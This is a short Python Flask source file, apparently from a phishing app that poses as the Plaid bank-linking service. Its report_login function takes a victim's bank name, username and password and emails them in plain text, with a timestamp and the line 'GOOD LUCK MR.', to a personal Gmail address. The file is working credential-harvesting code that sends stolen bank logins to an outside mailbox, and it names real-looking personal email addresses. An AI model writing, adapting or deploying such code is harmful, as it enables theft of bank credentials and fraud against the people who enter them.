from plaid_app import mail
from flask_mail import Message
from datetime import datetime

def report_login(username,password,bank_name):
    msg = Message('New Login', 
        sender='abdullahomotoke@gmail.com', 
        recipients=['adekunlealiamin010@gmail.com'])
    msg.body=f'''
    Bank Name ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    GOOD LUCK MR. 
    '''
    mail.send(msg)